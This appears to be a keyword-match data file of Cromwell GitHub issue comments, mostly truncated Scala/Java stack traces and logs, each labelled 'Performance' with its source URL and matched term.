Performance,.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.VariableLookupException: inputBams:; Could not find the shard mapping to this scat,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4351,concurren,concurrent,4351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['concurren'],['concurrent']
Performance,.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at soft,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7130,load,loadService,7130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loadService']
Performance,.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$B,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4585,concurren,concurrent,4585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,".engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99328,concurren,concurrent,99328,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:146); at akka.actor.Actor.aroundReceive(Actor.scala:539); at akka.actor.Actor.aroundReceive$(Actor.scala:537); at cromwell.backend.standard.StandardInitializationActor.aroundReceive(StandardInitializationActor.scala:44); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); at akka.actor.ActorCell.invoke(ActorCell.scala:581); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: wdl.draft2.parser.WdlP,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:5516,perform,performActionThenRespond,5516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['perform'],['performActionThenRespond']
Performance,".lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1231,concurren,concurrent,1231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,".scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.Dispatched",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3877,concurren,concurrent,3877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,".scala:442); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.$anonfun$apply$51(WdlNamespace.scala:441); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.apply(WdlNamespace.scala:440); at wdl.draft2.model.WdlNamespace$.$anonfun$load$1(WdlNamespace.scala:174); at scala.util.Try$.apply(Try.scala:213); at wdl.draft2.model.WdlNamespace$.load(WdlNamespace.scala:169); at wdl.draft2.model.WdlNamespace$.loadUsingSource(WdlNamespace.scala:161); at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:53); ... 27 common frames omitted; [2020-09-17 21:41:46,29] [info] Not triggering log of token queue status. Effective log interval = None; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:8672,load,load,8672,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,4,"['load', 'queue']","['load', 'loadUsingSource', 'queue']"
Performance,"/github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1459,concurren,concurrent,1459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"04,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:1479,concurren,concurrent,1479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"04,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:17,54] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.AllelicCNV:3:1] Status change from Running to Success; [2016-10-28 14:38:17,67] [info] WorkflowExecutionActor-a3dd8163-de37-4467-a227-5364959a8940 [a3dd8163]: Starting calls: case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1, case_gatk_acnv_workflow.PlotACNVResults:3:1; [2016-10-28 14:38:18,14] [info] JesRun [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JES Run ID is operations/ENPH6N2AKxi-zoCK0M65gEAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:18,31] [info] JesRun [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JES Run ID is operations/EPfI6N2AKxi_iI6",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:12224,concurren,concurrent,12224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99144,concurren,concurrent,99144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"1. I think call caching should work with the in-memory database, but I would think its utility is very limited – when you restart Cromwell and erase the DB, all of your call caching information is lost.; 2. Call caching operates at the task level and is independent of workflows. If a task has the same command, input files, docker images, and maybe some other stuff I don't remember, cache reading will take place.; 3. Maybe we do explicitly disable CC with HSQL for the reasons described in (1). In any case I strongly recommend setting up a persistent RDBMS if you intend to use Cromwell with call caching. Hope this helps,; Adam",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5280#issuecomment-561684948:385,cache,cache,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5280#issuecomment-561684948,1,['cache'],['cache']
Performance,1.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:69) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.Option.map(Option.scala:146) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at 